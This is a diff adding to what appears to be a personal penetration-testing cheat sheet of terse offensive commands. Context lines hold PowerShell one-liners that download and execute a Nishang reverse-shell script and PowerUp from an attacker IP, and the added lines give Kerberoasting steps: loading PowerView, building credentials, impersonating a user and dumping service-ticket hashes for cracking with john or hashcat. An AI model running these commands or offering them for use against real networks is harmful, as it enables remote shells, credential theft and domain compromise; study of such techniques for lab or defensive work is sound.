@@ -64,3 +64,12 @@ smbmap -H ip
 Windows Nishang Rbash like thingy:
 powershell -version 2 -command "IEX(New-Object Net.WebClient).DownloadString('http://:8000/Invoke-PowerShellTcp.ps1')"
 powershell -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.x.x:port/PowerUp.ps1');Invoke-AllChecks"
+
+Kerberoasting::
+use nishang Reverse shell
+use powerview to load
+encode the password :  $SecPassword = ConvertTo-SecureString 'Password' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('domain\user', $SecPassword) 
+Invoke-UserImpersonation -Credential $Cred
+Invoke-kerberoast | fl  { default format of key is john but format can be changed in hashcat}
+
